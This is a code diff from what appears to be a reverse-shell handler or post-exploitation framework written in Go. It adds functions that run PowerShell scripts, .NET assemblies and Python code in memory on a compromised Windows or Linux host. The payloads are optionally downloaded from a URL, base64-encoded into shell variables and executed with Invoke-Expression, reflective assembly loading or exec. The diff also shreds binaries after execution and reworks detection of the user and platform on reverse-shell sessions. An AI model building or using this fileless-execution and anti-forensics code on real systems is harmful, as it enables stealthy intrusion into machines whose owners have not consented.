@@ -195,7 +195,7 @@ func (s *SessionInfo) RunScriptInMemory(scriptSource string, args []string) erro
 
 	// Upload script to bash variable (in-memory, no disk write)
 	t := NewTransferer(s.Conn, s.ID)
-	if err := t.UploadToVariable(context.Background(), scriptPath, varName); err != nil {
+	if err := t.UploadToBashVariable(context.Background(), scriptPath, varName); err != nil {
 		return fmt.Errorf("upload to memory failed: %w", err)
 	}
 
@@ -299,6 +299,232 @@ func (s *SessionInfo) RunBinary(binarySource string, args []string) error {
 		// Cleanup both binary and output file
 		s.Handler.SendCommand(fmt.Sprintf("shred -uz %s %s 2>/dev/null || rm -f %s %s\n",
 			remotePath, remoteOutput, remotePath, remoteOutput))
+	}()
+
+	return nil
+}
+
+// RunPowerShellInMemory executes PowerShell scripts in-memory (Windows, zero disk writes)
+// Similar to RunScriptInMemory but for PowerShell on Windows
+func (s *SessionInfo) RunPowerShellInMemory(scriptSource string, args []string) error {
+	timestamp := time.Now().Format("2006_01_02-15_04_05")
+
+	// Download if URL
+	var scriptPath string
+	if strings.HasPrefix(scriptSource, "http://") || strings.HasPrefix(scriptSource, "https://") {
+		scriptPath = filepath.Join(s.ScriptsDir(), timestamp+"-"+filepath.Base(scriptSource))
+		if err := DownloadFile(scriptSource, scriptPath); err != nil {
+			return fmt.Errorf("download failed: %w", err)
+		}
+	} else {
+		scriptPath = scriptSource
+	}
+
+	// Output file
+	outputPath := filepath.Join(s.ScriptsDir(), timestamp+"-output.txt")
+
+	// Create empty output file for tail -f
+	if err := os.WriteFile(outputPath, []byte{}, 0644); err != nil {
+		return fmt.Errorf("failed to create output file: %w", err)
+	}
+
+	// Open terminal
+	tailCmd := fmt.Sprintf("tail -f %s", outputPath)
+
+	if err := OpenTerminal(tailCmd); err != nil {
+		fmt.Println(ui.Warning(fmt.Sprintf("Could not open terminal: %v", err)))
+	}
+
+	time.Sleep(300 * time.Millisecond)
+
+	// Generate unique variable name
+	varName := fmt.Sprintf("gummy_ps_%d", time.Now().UnixNano())
+
+	// Upload script to PowerShell variable (in-memory, no disk write)
+	t := NewTransferer(s.Conn, s.ID)
+	if err := t.UploadToPowerShellVariable(context.Background(), scriptPath, varName); err != nil {
+		return fmt.Errorf("upload to memory failed: %w", err)
+	}
+
+	// Build args (PowerShell style)
+	argsStr := ""
+	if len(args) > 0 {
+		argsStr = " " + strings.Join(args, " ")
+	}
+
+	// Show execution message with output path
+	fmt.Println(ui.Info(fmt.Sprintf("Executing PowerShell script (in-memory) and saving output to: %s", outputPath)))
+
+	go func() {
+		// Small delay to ensure variable is fully loaded
+		time.Sleep(500 * time.Millisecond) // Increased for PowerShell
+
+		// Debug: Check if variable exists and has content
+		debugCmd := fmt.Sprintf("if ($%s) { Write-Host 'Variable loaded: yes' } else { Write-Host 'Variable loaded: no' }\r\n", varName)
+		s.Handler.SendCommand(debugCmd)
+		time.Sleep(200 * time.Millisecond)
+
+		// Execute from variable: decode base64 and invoke
+		// PowerShell syntax: decode UTF8 string from base64, then Invoke-Expression
+		cmd := fmt.Sprintf("$decoded = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($%s)); Invoke-Expression \"$decoded%s\"; Remove-Variable -Name %s\r\n", varName, argsStr, varName)
+		if err := s.Handler.ExecuteWithStreaming(cmd, outputPath); err != nil {
+			fmt.Println(ui.Error(fmt.Sprintf("Execution error: %v", err)))
+			return
+		}
+	}()
+
+	return nil
+}
+
+// RunDotNetInMemory executes .NET assemblies in-memory (Windows, zero disk writes)
+// Uses reflection to load and execute assembly from memory
+func (s *SessionInfo) RunDotNetInMemory(assemblySource string, args []string) error {
+	timestamp := time.Now().Format("2006_01_02-15_04_05")
+
+	// Download if URL
+	var assemblyPath string
+	if strings.HasPrefix(assemblySource, "http://") || strings.HasPrefix(assemblySource, "https://") {
+		assemblyPath = filepath.Join(s.ScriptsDir(), timestamp+"-"+filepath.Base(assemblySource))
+		if err := DownloadFile(assemblySource, assemblyPath); err != nil {
+			return fmt.Errorf("download failed: %w", err)
+		}
+	} else {
+		assemblyPath = assemblySource
+	}
+
+	// Output file
+	outputPath := filepath.Join(s.ScriptsDir(), timestamp+"-output.txt")
+
+	// Create empty output file for tail -f
+	if err := os.WriteFile(outputPath, []byte{}, 0644); err != nil {
+		return fmt.Errorf("failed to create output file: %w", err)
+	}
+
+	// Open terminal
+	tailCmd := fmt.Sprintf("tail -f %s", outputPath)
+
+	if err := OpenTerminal(tailCmd); err != nil {
+		fmt.Println(ui.Warning(fmt.Sprintf("Could not open terminal: %v", err)))
+	}
+
+	time.Sleep(300 * time.Millisecond)
+
+	// Generate unique variable name
+	varName := fmt.Sprintf("gummy_asm_%d", time.Now().UnixNano())
+
+	// Upload assembly to PowerShell variable (in-memory, no disk write)
+	t := NewTransferer(s.Conn, s.ID)
+	if err := t.UploadToPowerShellVariable(context.Background(), assemblyPath, varName); err != nil {
+		return fmt.Errorf("upload to memory failed: %w", err)
+	}
+
+	// Build args (PowerShell array syntax)
+	argsStr := ""
+	if len(args) > 0 {
+		// Convert to PowerShell array: @('arg1', 'arg2')
+		quotedArgs := make([]string, len(args))
+		for i, arg := range args {
+			quotedArgs[i] = fmt.Sprintf("'%s'", strings.ReplaceAll(arg, "'", "''"))
+		}
+		argsStr = "@(" + strings.Join(quotedArgs, ", ") + ")"
+	} else {
+		argsStr = "@()"
+	}
+
+	// Show execution message with output path
+	fmt.Println(ui.Info(fmt.Sprintf("Executing .NET assembly (in-memory) and saving output to: %s", outputPath)))
+
+	go func() {
+		// Small delay to ensure variable is fully loaded
+		time.Sleep(200 * time.Millisecond)
+
+		// Execute assembly via reflection
+		// 1. Decode base64 to bytes
+		// 2. Load assembly with [Reflection.Assembly]::Load()
+		// 3. Find and invoke entry point
+		cmd := fmt.Sprintf(`
+$bytes = [System.Convert]::FromBase64String($%s)
+$assembly = [System.Reflection.Assembly]::Load($bytes)
+$entryPoint = $assembly.EntryPoint
+if ($entryPoint -ne $null) {
+    $entryPoint.Invoke($null, %s)
+} else {
+    Write-Host 'No entry point found in assembly'
+}
+Remove-Variable -Name %s
+`, varName, argsStr, varName)
+
+		if err := s.Handler.ExecuteWithStreaming(cmd+"\r\n", outputPath); err != nil {
+			fmt.Println(ui.Error(fmt.Sprintf("Execution error: %v", err)))
+			return
+		}
+	}()
+
+	return nil
+}
+
+// RunPythonInMemory executes Python scripts in-memory (Linux/Windows, zero disk writes)
+// Similar to RunScriptInMemory but for Python
+func (s *SessionInfo) RunPythonInMemory(scriptSource string, args []string) error {
+	timestamp := time.Now().Format("2006_01_02-15_04_05")
+
+	// Download if URL
+	var scriptPath string
+	if strings.HasPrefix(scriptSource, "http://") || strings.HasPrefix(scriptSource, "https://") {
+		scriptPath = filepath.Join(s.ScriptsDir(), timestamp+"-"+filepath.Base(scriptSource))
+		if err := DownloadFile(scriptSource, scriptPath); err != nil {
+			return fmt.Errorf("download failed: %w", err)
+		}
+	} else {
+		scriptPath = scriptSource
+	}
+
+	// Output file
+	outputPath := filepath.Join(s.ScriptsDir(), timestamp+"-output.txt")
+
+	// Create empty output file for tail -f
+	if err := os.WriteFile(outputPath, []byte{}, 0644); err != nil {
+		return fmt.Errorf("failed to create output file: %w", err)
+	}
+
+	// Open terminal
+	tailCmd := fmt.Sprintf("tail -f %s", outputPath)
+
+	if err := OpenTerminal(tailCmd); err != nil {
+		fmt.Println(ui.Warning(fmt.Sprintf("Could not open terminal: %v", err)))
+	}
+
+	time.Sleep(300 * time.Millisecond)
+
+	// Generate unique variable name
+	varName := fmt.Sprintf("_gummy_py_%d", time.Now().UnixNano())
+
+	// Upload script to Python variable (in-memory, no disk write)
+	t := NewTransferer(s.Conn, s.ID)
+	if err := t.UploadToPythonVariable(context.Background(), scriptPath, varName); err != nil {
+		return fmt.Errorf("upload to memory failed: %w", err)
+	}
+
+	// Build args (Python sys.argv style)
+	argsStr := ""
+	if len(args) > 0 {
+		argsStr = " " + strings.Join(args, " ")
+	}
+
+	// Show execution message with output path
+	fmt.Println(ui.Info(fmt.Sprintf("Executing Python script (in-memory) and saving output to: %s", outputPath)))
+
+	go func() {
+		// Small delay to ensure variable is fully loaded
+		time.Sleep(200 * time.Millisecond)
+
+		// Execute from variable: decode base64 and exec
+		// Python syntax: decode base64 string, then exec()
+		cmd := fmt.Sprintf("python3 -c \"import base64; exec(base64.b64decode(%s).decode('utf-8'))\" %s; unset %s\n", varName, argsStr, varName)
+		if err := s.Handler.ExecuteWithStreaming(cmd, outputPath); err != nil {
+			fmt.Println(ui.Error(fmt.Sprintf("Execution error: %v", err)))
+			return
+		}
 	}()
 
 	return nil
@@ -565,8 +791,12 @@ func (m *Manager) AddSession(id string, conn net.Conn, remoteIP string) {
 	m.sessions[id] = session
 	m.nextID++
 
-	// Detecta whoami e platform em background
-	go m.detectSessionInfo(session)
+	// Detecta whoami e platform SINCRONAMENTE antes de iniciar handler
+	// Isso garante que Platform está definido antes de Start() decidir sobre raw mode
+	m.detectSessionInfo(session)
+
+	// Configura platform no handler ANTES de qualquer uso
+	handler.SetPlatform(session.Platform)
 
 	// Inicia monitoramento da sessão
 	go m.monitorSession(session)
@@ -793,43 +1023,104 @@ func (m *Manager) handleRunModule(moduleName string, args []string) {
 	}
 }
 
-// detectSessionInfo detecta user@host e plataforma da sessão em background
+// detectSessionInfo detecta user@host e plataforma da sessão
 func (m *Manager) detectSessionInfo(session *SessionInfo) {
-	// Aguarda um pouco para a shell se estabilizar
-	time.Sleep(800 * time.Millisecond)
+	// Aguarda shell enviar algo
+	time.Sleep(1000 * time.Millisecond)
 
-	// Comando que funciona tanto em Linux quanto Windows
-	// Linux: retorna user@host e "linux"
-	// Windows: retorna username@computername e "windows"
-	detectionCmd := "echo $(whoami)@$(hostname) 2>/dev/null || echo %USERNAME%@%COMPUTERNAME%; uname 2>/dev/null || echo windows\n"
+	// Lê o que tiver disponível (com múltiplas tentativas)
+	initialPrompt := ""
+	buffer := make([]byte, 4096)
+
+	for attempt := 0; attempt < 10; attempt++ {
+		session.Conn.SetReadDeadline(time.Now().Add(500 * time.Millisecond))
+		n, err := session.Conn.Read(buffer)
+		session.Conn.SetReadDeadline(time.Time{})
+
+		if n > 0 {
+			initialPrompt += string(buffer[:n])
+		}
+
+		if err == nil && n > 0 {
+			// Continue lendo se tiver mais dados
+			time.Sleep(100 * time.Millisecond)
+			continue
+		}
+
+		// Se já temos dados suficientes, pode parar
+		if len(initialPrompt) > 0 {
+			break
+		}
+
+		// Senão, espera mais um pouco
+		time.Sleep(300 * time.Millisecond)
+	}
+
+	// Detecta platform baseado no prompt recebido
+	detectedPlatform := "unknown"
+
+	if strings.Contains(initialPrompt, "PS ") || strings.Contains(initialPrompt, "C:\\") || strings.Contains(initialPrompt, "C:/") {
+		detectedPlatform = "windows"
+	} else if strings.Contains(initialPrompt, "$") || strings.Contains(initialPrompt, "#") {
+		detectedPlatform = "linux"
+	}
+
+	session.Platform = detectedPlatform
+
+	// Para Windows, tenta comando diferente que funcione com WinRM reverse shells
+	var detectionCmd string
+	if detectedPlatform == "windows" {
+		detectionCmd = "echo $env:USERNAME@$env:COMPUTERNAME\r\n"
+	} else {
+		detectionCmd = "echo $(whoami 2>/dev/null)@$(hostname 2>/dev/null)\n"
+	}
+
 	_, err := session.Conn.Write([]byte(detectionCmd))
 	if err != nil {
 		session.Whoami = "unknown"
-		session.Platform = "unknown"
 		return
 	}
 
-	// Define timeout maior para leitura
-	session.Conn.SetReadDeadline(time.Now().Add(5 * time.Second))
+	// Aguarda execução
+	time.Sleep(800 * time.Millisecond)
 
-	// Lê toda a resposta em múltiplas tentativas
+	// Lê toda a resposta em múltiplas tentativas com timeout curto
 	allData := ""
-	buffer := make([]byte, 1024)
+	readBuffer := make([]byte, 2048)
 	foundWhoami := false
 	foundPlatform := false
 
-	for i := 0; i < 10; i++ { // máximo 10 tentativas
-		n, err := session.Conn.Read(buffer)
+	// IMPORTANTE: verifica se já detectamos platform pelo prompt inicial
+	if detectedPlatform != "unknown" {
+		foundPlatform = true
+	}
+
+	for i := 0; i < 20; i++ { // mais tentativas
+		// Timeout curto por tentativa (não timeout total)
+		session.Conn.SetReadDeadline(time.Now().Add(500 * time.Millisecond))
+		n, err := session.Conn.Read(readBuffer)
+
 		if err != nil {
-			if i > 0 { // Se já lemos algo, pode ter terminado
+			// Se é timeout mas já encontramos tudo, pode sair
+			if foundWhoami && foundPlatform {
 				break
 			}
-			session.Whoami = "unknown"
-			session.Platform = "unknown"
-			return
+			// Se é timeout mas já lemos algo, continua tentando
+			if len(allData) > 0 {
+				time.Sleep(200 * time.Millisecond)
+				continue
+			}
+			// Timeout no primeiro read = falha real
+			if i == 0 {
+				session.Whoami = "unknown"
+				session.Platform = "unknown"
+				return
+			}
+			break
 		}
 
-		allData += string(buffer[:n])
+		chunk := string(readBuffer[:n])
+		allData += chunk
 
 		// Se temos pelo menos uma linha completa, processa
 		if strings.Contains(allData, "\n") {
@@ -874,22 +1165,20 @@ func (m *Manager) detectSessionInfo(session *SessionInfo) {
 					}
 				}
 
-				// Se encontrou ambos, termina
+				// Se encontrou ambos, drena restante e termina
 				if foundWhoami && foundPlatform {
-					// Drena o restante rapidamente
-					go func() {
-						time.Sleep(100 * time.Millisecond)
-						drainBuffer := make([]byte, 2048)
-						session.Conn.SetReadDeadline(time.Now().Add(300 * time.Millisecond))
-						for {
-							n, err := session.Conn.Read(drainBuffer)
-							if err != nil || n == 0 {
-								break
-							}
+					// Drena o restante SINCRONAMENTE (importante!)
+					// Isso garante que quando Start() é chamado, não há mais output de detecção
+					time.Sleep(200 * time.Millisecond)
+					drainBuffer := make([]byte, 4096)
+					session.Conn.SetReadDeadline(time.Now().Add(500 * time.Millisecond))
+					for {
+						n, err := session.Conn.Read(drainBuffer)
+						if err != nil || n == 0 {
+							break
 						}
-						session.Conn.SetReadDeadline(time.Time{})
-					}()
-
+					}
+					session.Conn.SetReadDeadline(time.Time{})
 					return
 				}
 			}
@@ -905,7 +1194,7 @@ func (m *Manager) detectSessionInfo(session *SessionInfo) {
 	if !foundWhoami {
 		session.Whoami = "unknown"
 	}
-	if !foundPlatform {
+	if !foundPlatform && session.Platform == "detecting..." {
 		session.Platform = "unknown"
 	}
 }
